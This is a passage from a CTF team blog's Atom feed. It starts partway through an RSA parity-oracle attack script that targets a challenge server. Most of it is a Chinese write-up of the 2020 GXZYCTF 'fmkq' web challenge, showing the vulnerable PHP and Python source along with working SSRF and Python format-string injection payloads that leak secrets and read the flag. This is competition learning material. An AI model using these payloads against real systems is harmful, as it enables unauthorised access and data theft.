decrypt&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    r.send(str(l))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    r.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39;send the message in base64 encode&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    r.send(fuck)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    res = r.recvline()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    res = r.recvline()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    log.info(res)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;res:1&#39;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; res:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;res:0&#39;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; res:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;partial&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(n,e,c)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;global&lt;/span&gt; c_of_2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    k = n.bit_length()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    decimal.getcontext().prec = k&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    lower = decimal.Decimal(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    upper = decimal.Decimal(n)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    c_of_2 = pow(&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, e, n)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    c = (c * c_of_2) % n&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; range(k):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        possible_plaintext = (lower + upper) / &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        flag = oracle(c)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;not&lt;/span&gt; flag:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            upper = possible_plaintext&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            lower = possible_plaintext&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        c = (c * c_of_2) % n&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; i, flag, int(upper - lower)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; int(upper)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r = remote(&lt;span class=&quot;string&quot;&gt;&#39;121.37.174.33&#39;&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;9999&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39;n:&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;n = r.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39;\ne:&#39;&lt;/span&gt;,drop=&lt;span class=&quot;literal&quot;&gt;True&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;n = int(n)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39;flag:&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;c = r.recvuntil(&lt;span class=&quot;string&quot;&gt;&#39;\nyou&#39;&lt;/span&gt;,drop=&lt;span class=&quot;literal&quot;&gt;True&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;c = int(c)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;log.success(hex(n))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;log.success(hex(c))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;e = &lt;span class=&quot;number&quot;&gt;65537&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;print(partial(n,e,c))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Crypto" scheme="https://boiteam.github.io/categories/Crypto/"/>
    
    
      <category term="服务器访问" scheme="https://boiteam.github.io/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AE%BF%E9%97%AE/"/>
    
      <category term="RSA算法原理" scheme="https://boiteam.github.io/tags/RSA%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86/"/>
    
      <category term="RSA最低位爆破" scheme="https://boiteam.github.io/tags/RSA%E6%9C%80%E4%BD%8E%E4%BD%8D%E7%88%86%E7%A0%B4/"/>
    
      <category term="模数构造" scheme="https://boiteam.github.io/tags/%E6%A8%A1%E6%95%B0%E6%9E%84%E9%80%A0/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF fmkq</title>
    <link href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_fmkq/"/>
    <id>https://boiteam.github.io/2020/03/09/2020_GXZYCTF_fmkq/</id>
    <published>2020-03-09T01:52:20.000Z</published>
    <updated>2020-03-21T11:26:26.162Z</updated>
    
    <content type="html"><![CDATA[<p>访问直接给了题目源码👇</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'head'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span></span><br><span class="line"><span class="php">    $begin = <span class="string">"The number you want: "</span>;</span></span><br><span class="line"><span class="php">    extract($_GET);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($head == <span class="string">''</span>)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Where is your head?'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(preg_match(<span class="string">'/[A-Za-z0-9]/i'</span>,$head))&#123;</span></span><br><span class="line">        die('Head can\'t be like this!');</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match('/log/i',$url))&#123;</span><br><span class="line">        die('No No No');</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match('/gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:/i',$url))&#123;</span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Don\'t use strange protocol!'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $funcname = $head.<span class="string">'curl_init'</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    $ch = $funcname();</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($ch)&#123;</span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_URL, $url);</span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span></span><br><span class="line"><span class="php">        $output = curl_exec($ch);</span></span><br><span class="line"><span class="php">        curl_close($ch);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        $output = <span class="string">'rua'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> sprintf($begin.<span class="string">'%d'</span>,$output);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    show_source(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>关键就是触发curl了，参考<a href="https://www.php.net/manual/zh/function.sprintf" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.sprintf</a> 通过extract进行变量覆盖，覆盖begin为begin=%1$s，则<code>sprintf($begin.&#39;%d&#39;,$output);</code>处就可以输出，例如构造</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">?head</span>=\&amp;begin=<span class="meta">%1</span><span class="variable">$s</span>&amp;url=www.baidu.com</span><br></pre></td></tr></table></figure><p>则可以返回baidu的内容，所以显然用来SSRF最合适不过，发现127.0.0.1还开了8080端口，所以构造</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?head=\<span class="variable">&amp;begin</span>=%<span class="number">1</span>$s<span class="variable">&amp;url</span>=http:<span class="comment">//127.0.0.1:8080</span></span><br></pre></td></tr></table></figure><p><img src="/2020/03/09/2020_GXZYCTF_fmkq/image-20200309104345436.png" alt></p><p>也就是需要我们拿到vipcode，一通测试，python的格式化字符串问题，构造</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?head=\&amp;begin=%1$s&amp;url=<span class="link">http://127.0.0.1:8080/read/file=&#123;file.__init__.__globals__</span>[<span class="string">vip</span>]._<span class="emphasis">_init_</span><span class="emphasis">_._</span><span class="emphasis">_globals_</span><span class="emphasis">_&#125;%26vipcode=xxx</span></span><br></pre></td></tr></table></figure><p>可以读取到vipcode</p><p><img src="/2020/03/09/2020_GXZYCTF_fmkq/image-20200309105152178.png" alt></p><p>带上vipcode就可以为所欲为了</p><p><img src="/2020/03/09/2020_GXZYCTF_fmkq/image-20200309105248654.png" alt></p><p>提示了flag所在的文件，结合题目提示，flag的路径就是/fl4g_1s_h3re_u_wi11_rua/flag，读取题目源码可以发现fl4g被过滤了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#readfile.py</span></span><br><span class="line"><span class="keyword">from</span> .vip <span class="keyword">import</span> vip</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,file)</span>:</span></span><br><span class="line">        self.file = file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetName</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">readfile</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        filename = self.GetFileName()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'..'</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">'proc'</span> <span class="keyword">in</span> filename:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"quanbumuda"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                file = open(<span class="string">"/tmp/"</span> + filename, <span class="string">'r'</span>)</span><br><span class="line">                content = file.read()</span><br><span class="line">                file.close()</span><br><span class="line">                <span class="keyword">return</span> content</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"error"</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">r'file=.*?&amp;vipcode=.*?'</span>,data) != <span class="literal">None</span>:</span><br><span class="line">            data = data.split(<span class="string">'&amp;'</span>)</span><br><span class="line">            data = &#123;</span><br><span class="line">                data[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]: data[<span class="number">0</span>].split(<span class="string">'='</span>)[<span class="number">1</span>],</span><br><span class="line">                data[<span class="number">1</span>].split(<span class="string">'='</span>)[<span class="number">0</span>]: data[<span class="number">1</span>].split(<span class="string">'='</span>)[<span class="number">1</span>]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.file = File(data[<span class="string">'file'</span>])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'vipcode'</span> <span class="keyword">in</span> data.keys():</span><br><span class="line">                self.vipcode = data[<span class="string">'vipcode'</span>]</span><br><span class="line">            self.vip = vip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self) <span class="keyword">or</span> <span class="string">'vipcode'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self) <span class="keyword">or</span> <span class="string">'vip'</span> <span class="keyword">not</span> <span class="keyword">in</span> dir(self):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isvip</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.vipcode == self.vip.GetCode():</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetFileName</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.file.GetName()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current_folder_file = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vipreadfile</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,readfile)</span>:</span></span><br><span class="line">        self.filename = readfile.GetFileName()</span><br><span class="line">        self.path = os.path.dirname(os.path.abspath(self.filename))</span><br><span class="line">        self.file = File(os.path.basename(os.path.abspath(self.filename)))</span><br><span class="line">        <span class="keyword">global</span> current_folder_file</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            current_folder_file = os.listdir(self.path)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            current_folder_file = current_folder_file</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'fl4g'</span> <span class="keyword">in</span> self.path:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'nonono,this folder is a secret!!!'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output = <span class="string">'''Welcome,dear vip! Here are what you want:\r\nThe file you read is:\r\n'''</span></span><br><span class="line">            filepath = (self.path + <span class="string">'/&#123;vipfile&#125;'</span>).format(vipfile=self.file)</span><br><span class="line">            output += filepath</span><br><span class="line">            output += <span class="string">'\r\n\r\nThe content is:\r\n'</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f = open(filepath,<span class="string">'r'</span>)</span><br><span class="line">                content = f.read()</span><br><span class="line">                f.close()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                content = <span class="string">'can\'t read'</span></span><br><span class="line">            output += content</span><br><span class="line">            output += <span class="string">'\r\n\r\nOther files under the same folder:\r\n'</span></span><br><span class="line">            output += <span class="string">' '</span>.join(current_folder_file)</span><br><span class="line">            <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#vip.py</span></span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vipcode = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vip</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        global vipcode</span><br><span class="line">        <span class="keyword">if</span> vipcode == <span class="string">''</span><span class="symbol">:</span></span><br><span class="line">            vipcode = <span class="string">''</span>.join(random.sample(string.ascii_letters+string.digits, <span class="number">48</span>))</span><br><span class="line">            <span class="keyword">self</span>.truevipcode = vipcode</span><br><span class="line">        <span class="symbol">else:</span></span><br><span class="line">            <span class="keyword">self</span>.truevipcode = vipcode</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">GetCode</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>.truevipcode</span><br></pre></td></tr></table></figure><p>由于fl4g被过滤了，所以只能另辟蹊径，代码中</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">global</span> <span class="string">current_folder_file</span></span><br><span class="line"><span class="attr">try</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">current_folder_file</span> = <span class="string">os.listdir(self.path)</span></span><br><span class="line"><span class="attr">except</span>:<span class="string"></span></span><br><span class="line">    <span class="attr">current_folder_file</span> = <span class="string">current_folder_file</span></span><br></pre></td></tr></table></figure><p>所以可以通过current_folder_file来获取flag文件夹，构造</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;vipfile.<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">current_folder_file</span>][<span class="symbol">21</span>]&#125;/flag</span><br></pre></td></tr></table></figure><p><img src="/2020/03/09/2020_GXZYCTF_fmkq/0.png" alt>            </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;访问直接给了题目源码👇&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;error_reporting(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_GET[&lt;span class=&quot;string&quot;&gt;&#39;head&#39;&lt;/span&gt;])&amp;amp;&amp;amp;&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_GET[&lt;span class=&quot;string&quot;&gt;&#39;url&#39;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    $begin = &lt;span class=&quot;string&quot;&gt;&quot;The number you want: &quot;&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    extract($_GET);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;($head == &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;Where is your head?&#39;&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(preg_match(&lt;span 